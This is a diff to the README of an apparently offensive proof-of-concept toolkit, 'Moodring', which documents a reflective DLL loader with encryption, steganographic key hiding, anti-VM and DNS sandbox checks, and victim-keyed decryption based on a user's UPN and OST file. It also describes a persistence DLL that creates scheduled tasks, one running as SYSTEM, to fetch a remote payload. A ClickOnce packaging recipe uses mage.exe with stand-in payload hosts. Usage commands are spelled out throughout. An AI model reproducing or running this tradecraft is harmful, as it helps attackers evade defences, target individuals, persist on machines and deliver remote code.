@@ -1,15 +1,15 @@
 ## Moodring
-PoC reflective DLL loader with encryption, steg and env checks. Decryption key is bruteforced at runtime after DNS server check is performed. 
+PoC reflective DLL loader libraries with encryption, steg and env checks. Decryption key is bruteforced at runtime after env/vm checks are performed. 
 
 ### Cryptorchid - Encrypt and Hide 
-Command line Encrypt/Decrypt tool, can test if the hash can be retrieved and payload decrypted successfully prior to putting it in the pipeline
+Command line Encryptor/Debug tool, can test if the hash can be retrieved and payload decrypted successfully prior to putting it in the pipeline
 
 ```powershell
 # Skip DNS check, use steganography, and encrypt the dll using AAAA and steg the hash into logo.png, to create logo_copy.png with the hash embeded in least signifcant bit
  .\Cryptorchid.exe -nodns -steg AAAA .\calc.dll .\Logo.png
 
 # Check DNS match for google and check for Sandbox VMs, looks for encyrpted 'mod.txt' and png in the current dir, bruteforce to decrypt and load
-# This is to test the sideloading dll, change these values in Decryptorchid source under Program.Main().
+# This is to test the sideloading dll, change these values in Moodring source under Program.Main().
  .\Cryptorchid.exe 8.8.8.8 -antivm -stegload .\Logo_copy.png "Calc.Modes.RunCalc.Execute"
 
  # Pull hash from steg image and decrypt output to view (meant for text/test, will print the contents of dlls)
@@ -18,7 +18,7 @@ Command line Encrypt/Decrypt tool, can test if the hash can be retrieved and pay
  # Get hash of UPN for OST file matching
  .\Cryptorchid.exe -nodNS -hash manager@corpomax.com
 
- # Store hash of UPN in bit
+ # Store hash of UPN in least significant bit
 .\Cryptorchid.exe -nodNS -hideupn balls@krebsonsecurity.com .\NOGO.png
 
 # retrieve the hash from the image
@@ -34,27 +34,47 @@ Command line Encrypt/Decrypt tool, can test if the hash can be retrieved and pay
 .\Cryptorchid.exe -noDNs -decryptupn .\logo_copy.png Calc.Modes.RunCalc.Execute
 ```
 
-### Decryptorchid - Decrypts payload from encrypted text file using hash stored in image
-Sideloading DLL, bruteforces the payloads decryption and loads target into memory, invoking your desired method. 
-
+### Moodring - Decrypts payload from encrypted text file using hash stored in image
+Sideloader DLL, handles the payloads decryption and loads target into memory, invoking your desired method. 
 
 TODO: Have this an encrypted value we can pull as well from another image, get rid of the text file.
-TODO: if O365, keying off the email is possible since regkey can be used that contains users email.
- Query Key > Hash Value > Store Hash and Compare against our stored value, if match, decrypt.
 
-string storedHashValue = "";
- string regValue = Microsoft.Win32.Registry.GetValue(@"HKEY_CURRENT_USER\", "upn" null);
-string upnName = (string)regValue;
- string hashedUpnValue = GetSHA256Hash(upnName);
- bool correctKey = hashedUpnValue.Equals(storedHashValue);
- if (correctKey){
-    var rawPayload = rc4EncDecrypt(Encoding.UTF8.GetBytes(payload), upnName);
- }
- // run that motha
-
- Nope, target the ost/nst file instead, regkey incosistent.
-
+Added matching on UPN and OST file, pulls hash from image if the expected OST file is found and decrypts payload before loading.
 
 ### Taskmasker 
 Persister DLL, checks users permissions and creates a task, fetching a remote payload to an AppData directory. If admin, two tasks are created, one to run as SYSTEM. 
+
+### Package.ps1
+
+#### Mage Package
+Find a suitable .net host exe with AssemblyHunter
+
+```bat
+.\AssemblyHunter.exe path=C:\Users recurse=true clickonce=true signed=true
+```
+
+AddInUtil control (pops a window we can view console output on)
+
+```bat
+"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe" -New Application -Processor msil -ToFile AddInUtil.exe.manifest -name "AddInUtil" -Version 4.0.0.0 -FromDirectory .
+
+"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe" -New Deployment -Processor msil -Install false -ProviderUrl "https://payload.com/AddInUtil.application" -AppManifest AddInUtil.exe.manifest -ToFile AddInUtil.application
+
+# change addinutil.app from 1.0.0.0 to 4.0.0.0
+notepad AddInUtil.application
+```
+
+```bat
+set "MAGE_PATH=C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe"
+set "EXE_NAME=AddInUtil"
+set "URL=https://installer.payloads.com/AddInUtil.application"
+
+%MAGE_PATH% -New Application -Processor msil -ToFile %EXE_NAME%.exe.manifest -name "%EXE_NAME%" -Version 4.0.0.0 -FromDirectory .
+%MAGE_PATH% -New Deployment -Processor msil -Install false -ProviderUrl %URL% -AppManifest %EXE_NAME%.exe.manifest -ToFile %EXE_NAME%.application
+```
+
+Script version
+```bat
+mage.bat AddInUtil https://installer.payloads.com/AddInUtil.application
+```
 
